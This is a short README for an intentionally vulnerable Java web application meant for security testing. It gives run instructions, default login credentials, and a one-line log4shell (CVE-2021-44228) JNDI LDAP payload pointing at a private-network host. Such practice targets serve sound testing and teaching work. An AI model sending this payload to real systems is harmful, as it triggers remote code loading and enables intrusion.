# vulnerable-webapp
An application with various vulnerabilities for testing

## Running the application

- Run the java file: ```java -jar vulnerable-webapp-latest.jar```
- The default username is ```jblogs``` and the default password is ```pa55word```.
- You will need a web browser such as firefox.


# Some vulnerabilities

## CVE-2021-44228 (log4shell)

```
${jndi:ldap://172.16.182.1:8081/a}
```
